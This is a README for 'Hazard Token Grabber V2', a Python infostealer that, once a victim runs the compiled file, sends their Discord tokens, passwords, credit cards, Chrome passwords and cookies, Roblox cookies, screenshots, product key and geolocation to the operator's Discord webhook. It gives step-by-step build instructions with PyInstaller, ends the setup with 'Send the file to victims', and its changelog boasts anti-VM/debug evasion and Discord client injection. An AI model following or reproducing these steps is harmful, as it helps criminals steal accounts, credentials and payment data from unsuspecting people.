<p align="center">
  <img src="https://img.shields.io/github/languages/top/Rdimo/Hazard-Token-Grabber-V2?style=flat-square">
  <img src="https://img.shields.io/github/last-commit/Rdimo/Hazard-Token-Grabber-V2?style=flat-square">
  <img src="https://img.shields.io/github/stars/Rdimo/Hazard-Token-Grabber-V2?color=%23daff00&label=Stars&style=flat-square">
  <img src="https://img.shields.io/github/forks/Rdimo/Hazard-Token-Grabber-V2?color=%23daff00&label=Forks&style=flat-square">
</p>

## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟 Star this Repository if you enjoy Hazard Stealer V2!

**NOTE:** This is a free software. It will not be undetected from antivirus software, or have custom features. Remember, this is 100% free. If you want a better one, join [CheatAway](https://cheataway.com/) and purchase one.

---

#### Hazard-Token-Grabber-V2 was made by

Love ❌ code ✅

#### When someone executes the file, the following info will be sent to you:

- User Name
- Computer Name
- Windows Product Key & Build Info
- Pretty Fast Even if it Was Made With Python
- IP & Geolocation. (Country, City, Google Maps Location)
- A screenshot of all their monitors
- Roblox Cookies
- All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's token encryption)
- ~~Discord 2FA Codes for accounts with 2FA enabled~~
- Their Passwords & Credit Cards for Discord (updates when they change it)
- All Passwords and Cookies from the Chrome Browser
  > The webhook notification looks like this:
  <p align="left"><img src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/info.png">

### 📁・Setting up Hazard Token Grabber.V2

1. Install python if you have not already. [(Link Here)](https://www.python.org/)
2. Open up main.py with notepad or some other editor
3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with a discord webhook you've created. (Keep the quotes around the webhook)
4. Double Click `setup.bat` and allow it to finish.
5. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
6. Send the file to victims. 😈

### ⚙・Manually Compiling Source Code

If you do not want to use the batch file, you can follow this guide:

1. Open command prompt in the same directory as the .py file.
2. Type `pip install -r requirements.txt` (To install the modules)
3. Type: `pyinstaller --clean --onefile --noconsole -i NONE main.py`, you will see a lot of text popping up. Ignore it and wait.
4. After it says its finishing, you can find the EXE file in the dist directory, located in the project root!

### 💾・ More options

Add these into the command when creating the exe if you want
| PyInstaller Options |
| ------------------------------------ |
| `-n name` The name of the compiled EXE (Defaults to the name of the original .py file) |
| `-i icon.ico` The icon. You can specify a directory to an icon file, or do NONE for a default EXE icon. |
| `--clean` Removes all temporary files so you only have what you need. |
| `--uac-admin` Modified the MANIFEST so that it will request UAC permissions upon running. |
| `--hidden-import MODULENAME` Adds a module without it being present in the script. |

## 💭 〢 ChangeLog

```diff
v1.7.2 ⋮ 2022-05-23
+ fixed bug were discord would still restart even if kill_processes was off

v1.7.1 ⋮ 2022-05-22
+ https://github.com/Rdimo/Discord-Webhook-Protector now works with the injection

v1.7.0 ⋮ 2022-05-22
+ Added support for https://github.com/Rdimo/Discord-Webhook-Protector

v1.6.9 ⋮ 2022-05-16
- Removed my accidently added webhook and enabled the defaults again,

v1.6.8 ⋮ 2022-05-16
+ fixed unpack valueError bug (https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/297)

v1.6.7 ⋮ 2022-05-15
+ fixed TypeError bug were loc could be a NoneType

v1.6.6 ⋮ 2022-05-11
+ updated token regex since discord update the auth token

v1.6.5 ⋮ 2022-05-7
+ bug fixes
+ cleaner code

v1.6.4 ⋮ 2022-05-01
+ anti-vm/debug
+ better encrypted token regex
+ bug fixes

v1.6.3 ⋮ 2022-04-24
+ fixed grab encrypted tokens from other discord versions
+ optimization
+ better handler
+ bug fixes

v1.6.2 ⋮ 2022-04-19
+ fixed decoding
+ better err handling

v1.6.1 ⋮ 2022-04-17
+ updated to discord_desktop_core-3

v1.6.0 ⋮ 2022-04-08
+ config to customize options
+ class object for general functions
+ threads and async functions making it 10x faster
+ decorator for the chrome grabbing functions
+ changed from requests to httpx for async lib
+ grabs disk and ram size
+ better builder
+ cleaner embed
+ formatted code
```
